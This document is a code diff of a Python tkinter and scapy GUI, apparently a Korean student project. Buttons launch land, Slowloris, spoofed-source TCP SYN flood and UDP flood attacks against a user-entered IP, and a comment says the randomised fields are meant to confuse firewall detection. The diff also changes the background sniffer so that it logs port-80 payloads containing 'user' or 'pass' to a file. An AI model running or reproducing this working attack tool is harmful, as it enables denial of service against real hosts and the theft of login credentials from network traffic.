@@ -1,8 +1,10 @@
 import tkinter
-from tkinter import ttk, messagebox
+from tkinter import *
 from scapy.all import *
 import threading
-
+import socket
+import sys
+import time
 
 
 class GUIMODE():
@@ -22,12 +24,15 @@ class GUIMODE():
 
         self.ip_dst_data = tkinter.StringVar()
 
-        textbox = ttk.Entry(left_frame, width=20, textvariable=self.ip_dst_data)  # dst_IP 텍스트 공간 부여
-        self.packet_text = tkinter.Label(left_frame,width=60,height=25)  # 패킷 저장 내용 공간 부여
-        dos_manual=tkinter.Text(right_frame,width=50,height=50)
+        textbox = Entry(left_frame, width=20, textvariable=self.ip_dst_data)  # dst_IP 텍스트 공간 부여
 
-        self.packet_text.grid(sticky='s', rowspan=1)
-        textbox.grid(sticky='s', rowspan=2)   # 텍스트 칸 위치 선정
+        self.packet=Label(left_frame,width=50,height=30,text="패킷 내용:")
+
+        dos_manual=tkinter.Text(right_frame,width=50,height=50)
+        dos_manual.insert(tkinter.CURRENT,"UDP 설명\n")
+
+        self.packet.grid(sticky='s', rowspan=1)
+        textbox.grid(sticky='s', rowspan=2)  # 텍스트 칸 위치 선정
         dos_manual.grid(sticky='s')
 
 
@@ -39,21 +44,23 @@ class GUIMODE():
         self.Random = RandNum(1000, 9000)  # 무작위 설정 1000~9000
         self.s_ip = RandIP()
 
+        Packet_write = threading.Thread(target=self.file_packet)
+        Packet_write.start()
 
 
 
 
         # 버튼 위젯 생성
-        land_button = ttk.Button(left_frame, text="land 공격문", command=self.land)
-        slowloris_button = ttk.Button(left_frame, text="slowloris 공격문", command=self.Slowloris)
-        udp_flood_button = ttk.Button(left_frame, text="udp_flood 공격문", command=self.udp_flood)
-        tcp_flood_button = ttk.Button(left_frame, text="tcp_flood 공격문", command=self.tcp_flood)
+        land_button = Button(left_frame, text="land 공격문", command=self.land)
+        slowloris_button = Button(left_frame, text="slowloris 공격문", command=self.Slowloris)
+        udp_flood_button = Button(left_frame, text="udp_flood 공격문", command=self.udp_flood)
+        tcp_flood_button = Button(left_frame, text="tcp_flood 공격문", command=self.tcp_flood)
 
         #버튼 위젯 위치 선언
         land_button.grid(sticky='n', rowspan=2)
-        slowloris_button.grid(sticky='n', rowspan=4)
-        udp_flood_button.grid(sticky='n', rowspan=5)
-        tcp_flood_button.grid(sticky='n', rowspan=6)
+        slowloris_button.grid(sticky='n', rowspan=3)
+        udp_flood_button.grid(sticky='n', rowspan=4)
+        tcp_flood_button.grid(sticky='n', rowspan=5)
 
 
 
@@ -62,20 +69,16 @@ class GUIMODE():
 
 
     def showPacket(self,packet):
-        protocols = {1: 'ICMP', 6: 'TCP', 17: 'UDP'}
-        src_ip = packet[0][1].src
-        dst_ip = packet[0][1].dst
-        proto = packet[0][1].proto
-        if proto in protocols:
-            print("protocol: %s: %s -> %s" % (protocols[proto], src_ip, dst_ip))
+        data = '%s' % (packet[TCP].payload)
+        if 'user' in data.lower() or 'pass' in data.lower():
+            print('+++[%s]: %s' % (packet[IP].dst, data))
 
-            if proto == 1:
-                print("TYPE: [%d], CODE[%d]" % (packet[0][2].type, packet[0][2].code))
 
     def sniffing(self):
-        sniff(filter='ip', prn=self.showPacket, count=30)
+        filter='tcp port 80'
+        sniff(filter=filter, prn=self.showPacket, count=0)
 
-    def file_packit(self):
+    def file_packet(self):
         f = open("C:\\Users\\USER\\OneDrive\\바탕 화면\\packet.txt", "w")
         sys.stdout = f
         self.sniffing()
@@ -83,13 +86,12 @@ class GUIMODE():
     def file_read(self):
         f = open("C:\\Users\\USER\\OneDrive\\바탕 화면\\packet.txt", "r")
         lines = f.readlines()
-        for i in range(100):
-            self.packet_text.configure(text=lines)
+        for _ in range(100):
+            self.packet.configure(text=lines)
 
     def Slowloris(self): # Slowloris 유주환
         dst_ip = self.ip_dst_data.get()
-        t = threading.Thread(target=self.file_packit)
-        t.start()
+
         # 헤더의 변수에 User-agent 사용자정보와 사용자언어를 넣었다.
         headers = [
             "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
@@ -98,7 +100,6 @@ class GUIMODE():
 
         # 소켓을 리스트 형식으로 선언
         sockets = []
-        print(dst_ip+"dsadasdas")
         def setupSocket(ip):  # http 헤더
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # socket 생성
             sock.settimeout(4)  # 타임아웃 4초 설정
@@ -144,34 +145,38 @@ class GUIMODE():
                         sockets.append(sock)  # sockets 리스트 맨뒤에 sock을 추가한다.
                 except socket.error:
                     break  # 에러시 break 문
-        self.file_read()
+        Packet_reading = threading.Thread(target=self.file_read)
+        Packet_reading.start()
 
 
     def land(self):   # land 김진
         dst_ip = self.ip_dst_data.get()
-        e = threading.Thread(target=self.file_packit)
-        e.start()
+
         i = IP(src=dst_ip, dst=dst_ip)  #보낼 패킷을 입력한 주소와 함께 넣어준다
         i.proto = 6
         tu = TCP(dport=9001, sport=9001, flags=0x002) # 지정한 포트와 syn값을 tu 변수에 넣어준다.
+
+
         for x in range(1, self.count): #count 정도의 패킷을 반복적으로 전송한다.
             self.intercount += 1
-            send(i / tu / "hello word")
+            send(i/tu/"hello word")
             print("send packet:", self.intercount) # 패킷 보냈다는 문구
-        self.file_read()
+
+        Packet_reading = threading.Thread(target=self.file_read)
+        Packet_reading.start()
 
     def tcp_flood(self):    #tcp flood 이태서
 
         dst_ip = self.ip_dst_data.get()
         print("Packets are sending..") # 패킷 전송중
-        i = threading.Thread(target=self.file_packit)
-        i.start()
+
         i = IP(src=self.s_ip, dst=dst_ip) # 임의의 출발지 IP 생성 함수
         t = TCP(sport=self.Random, dport=self.dst_port, flags="S", seq=self.Random, window=self.Random) # 방화벽 탐지 설정 교란을 위한 무작위 숫자 추출 함수
         for Firewall_disturb in range(0, self.count):
             send(i / t, verbose=0)
             print("\nTotal packets sent: %i\n" % Firewall_disturb)
-        self.file_read()
+        Packet_reading = threading.Thread(target=self.file_read)
+        Packet_reading.start()
 
 
     def udp_flood(self): # udp flood 정재훈
@@ -179,8 +184,7 @@ class GUIMODE():
         duration = 100
         timeout = time.time() + duration
         sent = 0
-        f = threading.Thread(target=self.file_packit)
-        f.start()
+
         for i in range(self.count):
             if time.time() > timeout:
                 break
@@ -192,7 +196,9 @@ class GUIMODE():
             sent += 1
             print("UDP_Flooding_Attack Start: " + str(
                 sent) + " sent packages " + dst_ip + " At the Port " + str(self.dst_port))
-        self.file_read()
+
+        Packet_reading = threading.Thread(target=self.file_read)
+        Packet_reading.start()
 
 
 application=GUIMODE()
